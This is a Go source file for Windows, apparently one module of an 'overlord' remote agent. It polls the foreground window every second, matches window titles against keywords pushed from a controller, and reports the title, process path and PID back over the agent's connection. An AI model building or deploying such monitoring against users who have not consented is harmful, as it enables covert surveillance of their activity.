//go:build windows

package activewindow

import (
	"context"
	"log"
	"path/filepath"
	"strings"
	"time"
	"unsafe"

	"overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/wire"

	"golang.org/x/sys/windows"
)

var (
	user32                       = windows.NewLazySystemDLL("user32.dll")
	procGetForegroundWindow      = user32.NewProc("GetForegroundWindow")
	procGetWindowTextW           = user32.NewProc("GetWindowTextW")
	procGetWindowTextLengthW     = user32.NewProc("GetWindowTextLengthW")
	procGetWindowThreadProcessId = user32.NewProc("GetWindowThreadProcessId")
)

func Start(ctx context.Context, env *runtime.Env) error {
	if env == nil {
		return nil
	}
	log.Printf("activewindow: starting monitor")
	defer log.Printf("activewindow: stopped")

	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	var lastTitle string
	var lastPID uint32
	lastSent := make(map[string]int64)
	for {
		select {
		case <-ctx.Done():
			return nil
		case <-ticker.C:
			keywords := env.GetNotificationKeywords()
			if len(keywords) == 0 {
				continue
			}
			minIntervalMs := env.GetNotificationMinIntervalMs()
			title, pid := getActiveWindow()
			if title == "" && pid == 0 {
				log.Printf("activewindow: no foreground window detected")
			}
			if title == "" || pid == 0 {
				continue
			}
			if title == lastTitle && pid == lastPID {
				continue
			}
			lastTitle = title
			lastPID = pid
			log.Printf("activewindow: foreground title=\"%s\" pid=%d", title, pid)
			match := matchKeyword(title, keywords)
			if match == "" {
				log.Printf("activewindow: no keyword match (keywords=%d)", len(keywords))
				continue
			}
			if minIntervalMs > 0 {
				key := strings.ToLower(match)
				if last, ok := lastSent[key]; ok {
					if time.Since(time.UnixMilli(last)) < time.Duration(minIntervalMs)*time.Millisecond {
						log.Printf("activewindow: throttled match=\"%s\" minIntervalMs=%d", match, minIntervalMs)
						continue
					}
				}
				lastSent[key] = time.Now().UnixMilli()
			}
			procPath := queryProcessPath(pid)
			procName := filepath.Base(procPath)
			if procName == "." || procName == "" {
				procName = "unknown"
			}
			log.Printf("activewindow: matched keyword=\"%s\" process=\"%s\"", match, procName)
			note := wire.Notification{
				Type:        "notification",
				Category:    "active_window",
				Title:       title,
				Process:     procName,
				ProcessPath: procPath,
				PID:         int32(pid),
				Keyword:     match,
				TS:          time.Now().UnixMilli(),
			}
			if err := wire.WriteMsg(ctx, env.Conn, note); err != nil {
				log.Printf("activewindow: send notification failed: %v", err)
			} else {
				log.Printf("activewindow: notification sent")
			}
		}
	}
}

func matchKeyword(title string, keywords []string) string {
	if title == "" {
		return ""
	}
	lower := strings.ToLower(title)
	for _, kw := range keywords {
		k := strings.ToLower(strings.TrimSpace(kw))
		if k == "" {
			continue
		}
		if strings.Contains(lower, k) {
			return kw
		}
	}
	return ""
}

func getActiveWindow() (string, uint32) {
	hwnd := getForegroundWindow()
	if hwnd == 0 {
		return "", 0
	}
	length := getWindowTextLength(hwnd)
	if length == 0 {
		return "", getWindowPID(hwnd)
	}
	buf := make([]uint16, length+1)
	_, _, _ = procGetWindowTextW.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&buf[0])), uintptr(length+1))
	return windows.UTF16ToString(buf), getWindowPID(hwnd)
}

func getForegroundWindow() windows.Handle {
	hwnd, _, _ := procGetForegroundWindow.Call()
	return windows.Handle(hwnd)
}

func getWindowTextLength(hwnd windows.Handle) int {
	length, _, _ := procGetWindowTextLengthW.Call(uintptr(hwnd))
	return int(length)
}

func getWindowPID(hwnd windows.Handle) uint32 {
	var pid uint32
	_, _, _ = procGetWindowThreadProcessId.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&pid)))
	return pid
}

func queryProcessPath(pid uint32) string {
	h, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
	if err != nil {
		return ""
	}
	defer windows.CloseHandle(h)
	buf := make([]uint16, 1024)
	size := uint32(len(buf))
	if err := windows.QueryFullProcessImageName(h, 0, &buf[0], &size); err != nil {
		return ""
	}
	return windows.UTF16ToString(buf[:size])
}
